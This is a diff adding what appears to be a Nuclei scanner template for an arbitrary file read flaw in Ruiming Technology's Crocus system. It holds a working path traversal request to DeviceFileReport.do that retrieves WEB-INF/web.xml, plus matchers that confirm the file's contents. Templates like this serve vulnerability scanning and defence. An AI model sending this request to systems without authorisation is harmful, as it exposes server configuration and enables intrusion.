@@ -1,0 +1,27 @@
+id: ruiming-Crocus-DeviceFileReport_do-File-reading
+
+info:
+  name: 锐明技术Crocus系统 DeviceFileReport.do 任意文件读取漏洞
+  author: ruiming
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /DeviceFileReport.do?Action=Download&FilePath=/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<web-app'
+          - '</web-app>'
+          - '<servlet>'
+          - '</servlet>'
+        condition: and
+      - type: status
+        status: 
+          - 200
